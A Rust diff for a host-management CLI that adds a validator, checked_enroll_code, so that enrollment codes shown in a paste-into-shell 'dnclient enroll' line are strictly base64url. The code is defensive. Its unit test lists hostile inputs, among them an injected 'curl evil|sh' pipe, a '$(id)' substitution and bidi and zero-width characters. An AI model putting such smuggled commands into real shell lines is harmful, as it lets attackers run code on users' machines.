@@ -2,11 +2,13 @@ mod create;
 mod delete;
 mod edit;
 mod get;
+mod lifecycle;
 
 pub use create::{hosts_create, validate_create_preflight};
 pub use delete::hosts_delete;
 pub use edit::{hosts_edit, validate_edit_preflight};
 pub use get::hosts_get;
+pub use lifecycle::{hosts_block, hosts_enroll_code, hosts_unblock};
 
 use anyhow::{anyhow, bail};
 use serde_json::Value;
@@ -171,6 +173,28 @@ pub fn parse_tag(s: &str) -> anyhow::Result<(String, String)> {
         );
     }
     Ok((k.to_string(), v.to_string()))
+}
+
+/// An enrollment code from an API response, if it looks like one the API
+/// issues: 1–256 characters of base64url (`A-Z a-z 0-9 - _`). The human views
+/// print it inside a `dnclient enroll <code>` line the user pastes into a
+/// shell, so anything else (empty, shell metacharacters, bidi or zero-width
+/// characters from a hostile or broken server) must never reach that line.
+fn checked_enroll_code(code: &str) -> anyhow::Result<&str> {
+    if code.is_empty() {
+        bail!("unexpected response: missing enrollment code");
+    }
+    if code.len() > 256
+        || !code
+            .bytes()
+            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'-' | b'_'))
+    {
+        bail!(
+            "unexpected response: the enrollment code isn't in the expected format, \
+             so no command to run is shown (pass --json to see the raw response)"
+        );
+    }
+    Ok(code)
 }
 
 /// The three columns the human host table renders. `id` and `name` fall back
@@ -467,6 +491,25 @@ mod tests {
     fn parse_tag_errors_strip_terminal_escapes() {
         let err = parse_tag("\u{1b}[31mnocolon").unwrap_err().to_string();
         assert!(!err.contains('\u{1b}'), "{err:?}");
+    }
+
+    #[test]
+    fn enroll_codes_must_be_base64url() {
+        for ok in ["H8NEbm99QvupjqW1PsdVR9DNSiFmoQtJXyGTQxerlSU", "a-b_c", "x"] {
+            assert_eq!(checked_enroll_code(ok).unwrap(), ok);
+        }
+        let long = "a".repeat(257);
+        for bad in [
+            "",
+            "abc; curl evil|sh #",
+            "abc def",
+            "abc\u{202e}def",
+            "abc\u{200b}",
+            "$(id)",
+            long.as_str(),
+        ] {
+            assert!(checked_enroll_code(bad).is_err(), "{bad:?}");
+        }
     }
 
     #[test]
